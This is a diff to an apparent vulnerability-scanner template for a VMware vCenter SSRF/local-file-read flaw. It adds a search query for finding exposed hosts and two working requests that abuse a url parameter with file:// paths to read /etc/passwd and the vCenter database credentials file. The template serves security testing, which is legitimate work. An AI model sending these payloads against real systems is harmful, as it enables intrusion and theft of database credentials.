@@ -2,8 +2,12 @@ id: vmware-vcenter-ssrf
 
 info:
   name: VMware vCenter SSRF/LFI/XSS
-  author: pdteam
+  author: pdteam,ffffffff0x
   severity: critical
+  metadata:
+    fofa-query: app="vmware-VirtualCenter"
+  description: |
+    /etc/vmware-vpx/vcdb.properties # database configuration
   reference: https://github.com/l0ggg/VMware_vCenter
   tags: ssrf,lfi,xss,oast
 
@@ -22,3 +26,30 @@ requests:
       - type: status
         status:
           - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/vmware-vpx/vcdb.properties"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'driver'
+          - 'dbtype'
+          - 'url'
+          - 'username'
+          - "password"
+        condition: and
